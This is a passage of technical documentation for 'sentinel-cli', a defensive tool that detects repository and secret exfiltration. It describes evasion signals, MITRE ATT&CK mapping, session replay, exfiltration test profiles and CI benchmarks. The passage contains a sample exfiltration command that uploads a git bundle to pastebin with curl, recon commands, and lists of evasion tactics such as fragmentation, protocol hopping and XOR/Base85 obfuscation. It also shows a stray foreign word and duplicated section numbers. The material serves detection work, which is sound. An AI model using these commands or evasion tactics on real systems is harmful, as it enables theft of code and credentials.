- Implementar MITM TLS vía `node-forge` o `openssl`
- Captura de paquetes raw para DNS en tiempo real
- Hooks nativos: ETW (Windows), eBPF (Linux), `fs.watch` multiplataforma

### Capa 2: Correlación Temporal y de Comportamiento

- No detectar comandos aislados sino secuencias:
  ```
  lectura_masiva → compresión → conexión → transmisión
  ```
- Ventanas de correlación configurables (5s, 30s, 5min, 1h)
- Grafos de因果 entre procesos (reutilizar Agency Graph)

### Capa 3: Detección de Evasión

Identificar patrones diseñados para evadir detección:

- **Lectura artificialmente lenta**: 1000 archivos en 2h en lugar de 5s
- **Fragmentación**: 200MB enviados como 10,000 paquetes de 20KB
- **Cambio de protocolo**: Alterna entre HTTP, DNS, WebSocket, QUIC
- **Ofuscación**: XOR → Base85 → Chunks → JSON en lugar de gzip directo
- **Detección de monitor**: El proceso cambia comportamiento cuando sentinel-cli está activo

### Capa 4: Canarios y Validación

- Archivos señuelo con firmas únicas (canary tokens)
- Secretos falsos en ubicaciones predecibles
- Historial Git contaminado con commits señuelo
- Sesiones controladas para medir tasa de detección vs falsos positivos

### Capa 5: Anti-Evasion Score

Ver [sección 14](#14-anti-evasion-score).

### Capa 6: Mutation Lab para Comportamiento

Ver [sección 15](#15-mutation-lab-para-comportamiento).

---

## 18. Anti-Evasion Score

El Anti-Evasion Score no pregunta "¿exfiltró?" sino **"¿cuánto esfuerzo está haciendo este proceso para parecer normal?"**

### Señales de evasión

| Señal | Descripción | Peso |
|-------|-------------|------|
| `ARTIFICIAL_RHYTHM` | Accesos perfectamente espaciados en el tiempo | 20 |
| `FRAGMENTED_TRAFFIC` | Tráfico dividido en chunks anormalmente pequeños | 25 |
| `PROTOCOL_HOPPING` | Cambios frecuentes de protocolo de salida | 30 |
| `CUSTOM_COMPRESSION` | Uso de compresión no estándar (XOR, Base85, etc.) | 20 |
| `MONITOR_AWARENESS` | Cambio radical de comportamiento cuando Sentinel está presente | 40 |
| `MEMORY_ONLY` | Lectura completa del repo sin escritura a disco | 25 |
| `DISTRIBUTED_CHAIN` | Varios procesos en cadena (lectura→compresión→envío) | 35 |
| `NO_TEMP_FILES` | Ausencia total de archivos temporales durante operación intensiva | 15 |

### Cómputo

```typescript
computeAntiEvasionScore(context: AuditContext): number {
  let score = 0;
  for (const signal of this.detectSignals(context)) {
    score += signal.weight;
  }
  // Normalizar a 0–100
  return Math.min(100, score);
}
```

### Interpretación

| Score | Interpretación |
|-------|----------------|
| 0–20 | Comportamiento normal, sin indicios de evasión |
| 21–50 | Anomalías menores, posible optimización legítima |
| 51–75 | Esfuerzo deliberado de evasión, requiere investigación |
| 76–100 | Evasión activa y sofisticada, alta probabilidad de exfiltración intencionada |

---

## 19. Evidence Hash Chain

### Concepto

Cada `Evidence` en una sesión de auditoría se encadena criptográficamente mediante SHA-256:

```
Evento 0
  timestamp
  evidenceId
  evidenceType
  summary
  previousHash = null
  hash = SHA256(index + timestamp + evidenceId + type + summary + "")

Evento 1
  previousHash = hash0
  hash = SHA256(index + timestamp + evidenceId + type + summary + hash0)
```

### Implementación

**Archivo**: `src/core/network/evidence-chain-crypto.ts`

- `buildEvidenceChain(evidence[]): EvidenceRecord[]` — ordena por timestamp, calcula hashes encadenados
- `verifyEvidenceChain(records[]): EvidenceChainVerification` — recalcula cada hash y valida contra el almacenado

### Integración

La cadena se genera en `pipeline.generateVerdict()` y se incluye en el `Verdict` como `evidenceChain` + `evidenceChainVerification`.

### Exportación

Al exportar una sesión, el reporte incluye:

```
Evidence verified
  ✓ 542 records
  ✓ chain valid
  ✓ no tampering detected
  first hash: a1b2c3d4...
  last hash:  e5f6g7h8...
```

### Seguridad

- Cualquier modificación de un registro existente invalida su hash
- La modificación del previousHash rompe el encadenamiento
- No se puede reordenar la cadena sin romper todos los hashes posteriores

---

## 20. MITRE ATT&CK Mapping

### Concepto

Cada `BehaviorType` se mapea a una técnica y táctica de MITRE ATT&CK para enriquecer los reportes con un marco de seguridad estándar.

### Mapeo completo

| Behavior | Técnica MITRE | Táctica |
|---|---|---|
| `repo_indexed`, `git_history_read`, `git_objects_read` | T1213 — Data from Information Repositories | Collection |
| `git_bundle_created` | T1074 — Data Staged | Collection |
| `git_bundle_uploaded`, `code_upload`, `secrets_exfiltrated`, `canary_exfiltrated`, `fake_secret_exfiltrated` | T1041 — Exfiltration Over C2 Channel | Exfiltration |
| `git_archive_created` | T1560 — Archive Collected Data | Collection |
| `secrets_scanned`, `fake_secret_read` | T1555 — Credentials from Password Stores | Credential Access |
| `embeddings_generated`, `mass_file_read`, `canary_read`, `contaminated_git_read`, `evidence_chain_detected` | T1005/T1213 — Data from Local System / Repositories | Collection |
| `full_repo_snapshot` | T1074 — Data Staged | Collection |
| `suspicious_connection`, `ai_prompt_sent` | T1071 — Application Layer Protocol | Command and Control |
| `dns_suspicious`, `tls_suspicious` | T1572 — Protocol Tunneling | Command and Control |
| `process_suspicious`, `process_chain_detected` | T1059 — Command and Scripting Interpreter | Execution |
| `anti_evasion_detected` | T1564 — Hide Artifacts | Defense Evasion |
| `monitor_awareness_detected` | T1497 — Virtualization/Sandbox Evasion | Defense Evasion |
| `monitor_disabled` | T1562 — Impair Defenses | Defense Evasion |
| `preparation_detected`, `pre_operational_snapshot_detected` | T1590 — Gather Victim Network Information | Reconnaissance |
| `canary_modified` | T1565 — Data Manipulation | Impact |
| `prompt_injection_attempt` | T1567 — Exfiltration Over Web Service | Exfiltration |

### Implementación

**Archivo**: `src/core/network/mitre-attack.ts`

- `getMitreMapping(type): MitreAttackMapping` — mapeo individual
- `buildMitreMappings(types[]): MitreAttackMapping[]` — construye lista deduplicada

### Reporte

El reporte de sesión incluye cobertura ATT&CK:

```
ATT&CK Coverage
  Collection    ✓ (T1213, T1074, T1560)
  Exfiltration  ✓ (T1041, T1567)
  Defense Evasion ✓ (T1564, T1497, T1562)
  Reconnaissance  ✓ (T1590)
```

---

## 21. Behavior Timeline

### Concepto

Los behaviors se organizan en una línea de tiempo por etapas:

```
Preparation → Collection → Packaging → Exfiltration
```

Cada behavior se asigna a una etapa según su propósito:

| Etapa | Behaviors |
|---|---|
| Preparation | `preparation_detected`, `pre_operational_snapshot_detected` |
| Collection | `git_history_read`, `git_objects_read`, `mass_file_read`, `secrets_scanned`, `embeddings_generated`, `full_repo_snapshot`, `canary_read`, `fake_secret_read` |
| Packaging | `git_bundle_created`, `git_archive_created` |
| Exfiltration | `code_upload`, `git_bundle_uploaded`, `secrets_exfiltrated`, `canary_exfiltrated`, `fake_secret_exfiltrated` |

### Implementación

**Archivo**: `src/core/network/mitre-attack.ts`

- `getBehaviorStage(type): Stage` — clasifica un behavior en Preparation/Collection/Packaging/Exfiltration/Other
- `buildBehaviorTimeline(behaviors[]): Stage[]` — construye timeline ordenado por etapa

### Reporte

```
Timeline
  [Preparation]  whoami, ipconfig, nslookup
  [Collection]   git rev-list --all, git cat-file
  [Packaging]    git bundle create
  [Exfiltration] curl --data-binary @repo.bundle https://pastebin.com
```

---

## 22. Mutation Lab para Comportamiento

Extender la filosofía de Mutation Lab (actualmente para scanner de PRs) al dominio de comportamiento de red.

### Concepto

No mutar código fuente sino **sesiones de auditoría completas**.

### Mutaciones

```
Session base:
  lee 500 archivos → POST → OpenAI

Mutaciones:
  → más lento (5ms → 5s entre reads)
  → cambia dominio (api.openai.com → custom-domain.com)
  → fragmenta (200MB → 20KB × 10,000)
  → cambia protocolo (HTTPS → DNS → WebSocket → WebRTC)
  → cambia compresión (gzip → XOR → Base85 → lz4)
  → cambia almacenamiento (disco → RAM → shared memory)
  → cambia proceso (node.exe → python → powershell → curl)
  → distribuye (proceso A lee, B comprime, C envía)
```

### Objetivo

El Behavior Engine debe detectar la **intención** (exfiltración del repositorio) independientemente de la implementación concreta. Cada mutación que evade la detección revela una debilidad en el modelo de comportamiento.

### Métrica

```
Tasa de detección = sesiones detectadas / sesiones totales
Tasa de falsos positivos = sesiones normales marcadas como exfiltración
```

El objetivo es mantener >90% de detección con <5% de falsos positivos a través de todas las mutaciones.

---

## Apéndice A: Dependencias

El módulo no introduce dependencias nuevas. Todo se implementa con librerías existentes:

- `better-sqlite3`: Base de datos local
- `commander`: CLI interface
- `picocolors`: Renderizado de consola
- `crypto` (built-in): Hashing, key generation
- `net`, `http`, `tls`, `fs`, `path`, `os`, `child_process` (built-in): Telemetría y red
- `readline` (built-in): Consentimiento legal interactivo

## Apéndice B: Compilación y Pruebas

```bash
# Compilación
npx tsc --noEmit
  → 0 errores, 0 warnings

# Pruebas
npx vitest run
  → 30 suites, 670 tests, 0 fallos
```

## Apéndice C: Archivos de Configuración

| Archivo | Propósito |
|---------|-----------|
| `~/.sentinel/network-audit.db` | Base de datos SQLite de auditoría |
| `~/.sentinel/certs/` | Directorio de certificados (TLS interceptor futuro) |

---

## 20. Session Recording Subsystem

The recording subsystem captures real OS sessions for offline replay and benchmarking. It is independent of the live audit pipeline; recordings are saved as JSON files and replayed deterministically through the same `NetworkAuditPipeline`.

### 20.1 Recording Pipeline

```
record-session.js <profile-id> <duration-sec> <work-command>
  │
  ├── Start persistent process monitor (PowerShell, 50ms polling)
  ├── Start persistent git detector (PowerShell, 50ms polling)
  │
  ├── Spawn work command in background job
  ├── Wait for duration (or work command completion)
  │
  ├── Stop all monitors
  ├── Canonicalize events (schema normalization)
  ├── Add profile metadata (from canonical-sessions.ts)
  ├── Capture environment snapshot (OS, versions, CPU, RAM)
  ├── Capture private metadata (hostname, username, cwd)
  │
  ├── Save session: replay-corpus/recorded/session-<id>.json
  ├── Save ground truth: replay-corpus/recorded/session-<id>.ground-truth.json
  │
  └── Replay through pipeline for immediate feedback
```

### 20.2 Event Types Captured

| Source | Fields |
|--------|--------|
| Process events | pid, name, commandLine, parentPid, parentName, username |
| Git commands | pid, processName, commandLine, action (classified), repository |
| File accesses | filePath, processName, pid, operation (read/write/open/create) |

### 20.3 Session Schema (`RecordedSession`)

```
interface RecordedSession {
  format: 'sentinel-session-v1';
  metadata: {
    id: string;
    recordedAt: string;
    durationMs: number;
    platform: string;
    sentinelVersion: string;
    tags: string[];
    profile?: SessionProfile;
    environment?: SessionEnvironment;   // public metadata
  };
  private?: SessionPrivateMetadata;    // hostname, username, cwd (excluded from corpus)
  events: ScenarioEvent[];             // process | git_command | file_access
}
```

Public environment metadata can be shared; private metadata (hostname, username, working directory) is segregated in the `private` field for confidentiality.

### 20.4 Ground Truth Protocol

Each recorded session has a companion `.ground-truth.json` file:

```
interface SessionGroundTruth {
  profileId: string;
  expectedRisk: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  expectedBehaviors: string[];
  forbiddenBehaviors: string[];
  reviewedBy: string;          // 'automated' | '<reviewer-name>'
  reviewStatus: 'unreviewed' | 'verified' | 'flagged';
  notes?: string;
}
```

Ground truth serves as the independent standard for replay evaluation. A session passes replay if its risk level matches `expectedRisk` and no `forbiddenBehaviors` are present.

---

## 21. Replay Engine

The `ReplayEngine` (`src/core/network/replay-engine.ts`) replays recorded sessions through the detection pipeline deterministically.

### 21.1 Replay Flow

```
replayFile(session.json)
  │
  ├── Load and validate session format
  ├── Create NetworkAuditPipeline instance
  ├── Process each event in chronological order:
  │   ├── process → classifyProcess() → build evidence
  │   ├── git_command → classifyGitCommand() → build evidence
  │   └── file_access → classifyFileAccess() → build evidence
  ├── Apply anti-evasion detection
  ├── Correlate evidence chains
  ├── Generate verdict (risk score, level, behaviors)
  └── Return ReplayResult
```

### 21.2 CLI Commands

| Command | Description |
|---------|-------------|
| `sentinel-cli network replay run <file>` | Replay single session |
| `sentinel-cli network replay campaign <dir>` | Replay all sessions in directory, produce campaign report |
| `sentinel-cli network replay diff <baseline> <current>` | Compare two replay campaign results |

### 21.3 Replay Result

```
interface ReplayResult {
  sessionId: string;
  sessionName: string;
  verdict: Verdict | null;
  riskScore: number;
  riskLevel: string;
  confidence: number;
  behaviorsDetected: string[];
  errors: string[];
  durationMs: number;
  replayedAt: string;
}
```

---

## 22. Canonical Profiles

31 canonical session profiles (`src/core/network/canonical-sessions.ts`) define the universe of behaviors the system should detect.

### 22.1 Profile Schema

```
interface SessionProfile {
  id: string;                    // 'git-clone', 'exfil-pastebin', etc.
  category: 'benign' | 'ia' | 'suspicious' | 'malicious';
  tool: string;                  // 'git', 'npm', 'curl', etc.
  action: string;                // 'clone', 'install', 'upload', etc.
  expectedRisk: string;          // LOW / MEDIUM / HIGH / CRITICAL
  description: string;
  tags: string[];
  requires?: EnvironmentDependency[];  // ['docker', 'go', 'terraform']
}
```

### 22.2 Profile Catalog

| ID | Category | Tool | Expected Risk |
|----|----------|------|---------------|
| git-clone | benign | git | LOW |
| git-fetch | benign | git | LOW |
| git-pull | benign | git | LOW |
| git-rebase | benign | git | LOW |
| git-push | benign | git | LOW |
| git-log | benign | git | LOW |
| git-status | benign | git | LOW |
| git-diff | benign | git | LOW |
| npm-install | benign | npm | LOW |
| npm-test | benign | npm | LOW |
| cargo-build | benign | cargo | LOW |
| go-mod-download | benign | go | LOW |
| docker-build | benign | docker | LOW |
| docker-pull | benign | docker | LOW |
| terraform-plan | benign | terraform | LOW |
| terraform-apply | benign | terraform | LOW |
| cursor-edit | ia | cursor | MEDIUM |
| cursor-refactor | ia | cursor | MEDIUM |
| copilot-chat | ia | copilot | LOW |
| claude-code | ia | claude-code | MEDIUM |
| grep-secrets | suspicious | grep | MEDIUM |
| read-env | suspicious | cat | MEDIUM |
| read-git | suspicious | git | MEDIUM |
| read-ssh | suspicious | cat | HIGH |
| mass-file-read | suspicious | find | HIGH |
| exfil-pastebin | malicious | curl | CRITICAL |
| exfil-gist | malicious | gh | CRITICAL |
| exfil-discord | malicious | curl | CRITICAL |
| exfil-dns | malicious | dig | CRITICAL |
| exfil-git-bundle | malicious | git | CRITICAL |
| exfil-tar-git | malicious | tar | CRITICAL |

Profiles with `requires: ['docker']`, `['go']`, or `['terraform']` are environment-dependent and excluded from effective corpus coverage when the tool is not available.

### 22.3 Environment Dependencies

Tools required by some profiles are detected via `Get-Command` (Windows) or `which` (Linux) at evaluation time:

- **docker** — Required by `docker-build`, `docker-pull`
- **go** — Required by `go-mod-download`
- **terraform** — Required by `terraform-plan`, `terraform-apply`

Profiles whose dependencies are missing are reported as `Unavailable (environment-dependent)` in corpus coverage rather than `Missing`.

---

## 23. Corpus Coverage

The `computeCorpusCoverage()` function (`src/cli/network/corpus-coverage.ts`) evaluates how many canonical profiles have been captured in the corpus.

### 23.1 Coverage Report

```
Corpus Coverage

  Canonical profiles:       31
  Unavailable (env-dep):    5
  ─────────────────────────────────
  Effective total:          26
  Captured:                 26
  Missing (could capture):  0
  Effective coverage:       100%

  By category (effective coverage):
    Benign:          11/11 (100.0%)  (5 env-dep)
    Ia:               4/4  (100.0%)
    Suspicious:       5/5  (100.0%)
    Malicious:        6/6  (100.0%)

  Unavailable (environment-dependent):
    [B] docker-build           (requires: docker)
    [B] docker-pull            (requires: docker)
    [B] go-mod-download        (requires: go)
    [B] terraform-apply        (requires: terraform)
    [B] terraform-plan         (requires: terraform)
```

### 23.2 CLI

```
sentinel-cli network corpus coverage <corpus-dir>
```

---

## 24. CI Gate

The CI gate (`src/ci-gate.ts`) is the primary regression detection mechanism. It runs 5 independent validation layers and records a benchmark entry on each execution.

### 24.1 Validation Layers

| Layer | Source | Count | Threshold | Purpose |
|-------|--------|-------|-----------|---------|
| Calibrated | Synthetic scenarios | 39 | 100% | Engine correctly reproduces calibration |
| Blind #1 | Independent scenarios | 15 | 60% | Generalization to unseen scenarios |
| Blind #2 | Frozen-engine scenarios | 14 | 60% | Stability against scenario variance |
| Blind #3 | Policy-frozen scenarios | 14 | 60% | Consistency with fixed classification policy |
| Replay | Recorded sessions | 26 | Acc ≥75%, Rec ≥95%, FPR ≤70%, FNR ≤5% | Real-world detection quality |

### 24.2 Usage

```bash
# Run full gate (exit code 0 = pass, 1 = fail)
node dist/ci-gate.js

# With custom replay directory
node dist/ci-gate.js --replay-dir ./replay-corpus/recorded
```

### 24.3 Gate Output

```
CI Gate: Regression Check

  Calibrated Corpus:  39/39 (100%)  min 100%
  Blind #1:           10/15 (66.7%)  min 60%
  Blind #2:           11/14 (78.6%)  min 60%
  Blind #3:           13/14 (92.9%)  min 60%
  Replay Accuracy:     100.0%  75.0%
  Replay Precision:    100.0%  75.0%
  Replay Recall:       100.0%  95.0%
  Replay F1:           100.0%  75.0%
  Replay FPR:          0.0%   70.0%
  Replay FNR:          0.0%   5.0%

  All gates passed. No regressions detected.
```

### 24.4 Confusion Matrix

Replay evaluation uses a standard confusion matrix:

| | Should be non-LOW | Should be LOW |
|---|---|---|
| Engine flagged | True Positive | False Positive |
| Engine did not flag | False Negative | True Negative |

Metrics derived: accuracy, precision, recall, specificity, F1, FPR, FNR.

---

## 25. Benchmark History

Benchmark entries are automatically recorded by the CI gate to `benchmark-history.json`.

### 25.1 Entry Schema

```
interface BenchmarkEntry {
  engineVersion: string;
  timestamp: string;
  calibrated: { passed: number; total: number; passRate: number };
  blind: Array<{ name: string; passed: number; total: number; passRate: number }>;
  replay: {
    accuracy: number;
    precision: number;
    recall: number;
    f1: number;
    fpr: number;
    fnr: number;
    tp: number;
    fp: number;
    tn: number;
    fn: number;
    latencyAvgMs: number;
    latencyP50Ms: number;
    latencyP95Ms: number;
    latencyP99Ms: number;
    latencyMaxMs: number;
    latencyStdDevMs: number;
  };
}
```

### 25.2 History View

```
Benchmark History

  Version Date    Cal%    B1%     B2%     B3%     Acc     Prec    Rec     F1      FPR     FNR
  ─────────────────────────────────────────────────────────────────────────────────────────────────
  1.0.0    2026-07-18 100.0   66.7    78.6    92.9    100.0   100.0   100.0   100.0   0.0     0.0
```

### 25.3 Delta Comparison

When 2+ entries exist, a delta table compares the current vs previous version across all metrics including latency distribution.

```
  vs 0.9.0:
  ┌─────────────────┬───────────┬───────────┐
  │ Metric           │ 0.9.0     │ 1.0.0     │
  ├─────────────────┼───────────┼───────────┤
  │ Calibrated       │ 100.0     │ 100.0     │
  │ Blind #1         │ 66.7      │ 66.7      │
  │ Blind #2         │ 71.4      │ 78.6      │
  │ Blind #3         │ 85.7      │ 92.9      │
  │ Accuracy         │ 80.0      │ 100.0     │
  │ Precision        │ 77.8      │ 100.0     │
  │ Recall           │ 100.0     │ 100.0     │
  │ F1               │ 87.5      │ 100.0     │
  │ FPR              │ 20.0      │ 0.0       │
  │ FNR              │ 0.0       │ 0.0       │
  │ Latency Avg (ms) │ 1.2       │ 0.8       │
  │ Latency P50 (ms) │ 0.5       │ 0.3       │
  └─────────────────┴───────────┴───────────┘
```

### 25.4 CLI

```
sentinel-cli network benchmark history
```

---

## 26. Corpus Versioning

The corpus has a version manifest at `replay-corpus/corpus-version.json`:

```
{
  "version": "1.0.0",
  "recordedAt": "2026-07-17T22:00:00.000Z",
  "sentinelVersion": "1.0.0",
  "recordingProtocol": "v1",
  "profiles": {
    "total": 31,
    "captured": 26,
    "unavailable": 5,
    "effectiveTotal": 26,
    "effectiveCoveragePct": 100
  },
  "environment": {
    "docker": false,
    "go": false,
    "terraform": false
  },
  "byCategory": {
    "benign":     { "total": 16, "captured": 11, "unavailable": 5 },
    "ia":         { "total": 4,  "captured": 4,  "unavailable": 0 },
    "suspicious": { "total": 5,  "captured": 5,  "unavailable": 0 },
    "malicious":  { "total": 6,  "captured": 6,  "unavailable": 0 }
  }
}
```

Each corpus version is immutable. New recordings should create a new version directory (e.g., `replay-corpus/recorded-v1.1/`) with its own `corpus-version.json`.

---

## 27. Validation Framework Summary

The 5-layer validation architecture provides comprehensive regression protection:

```
Layer 1: Calibrated synthetic   →  Engine correctness  [39 scenarios, 100% required]
Layer 2-4: Blind corpuses       →  Generalization       [3 corpuses, 14-15 each, 60% required]
Layer 5: Recorded replay        →  Real-world quality   [26 sessions, Acc≥75%, Rec≥95%, FPR≤70%]
```

Each layer tests a different property:
- Calibrated: does the engine produce the exact expected results for known scenarios?
- Blind: does the engine generalize to scenarios it was not calibrated against?
- Replay: does the engine detect actual OS-level activity with acceptable accuracy?

---

*Documentacion tecnica v2.0 — Julio 2026*
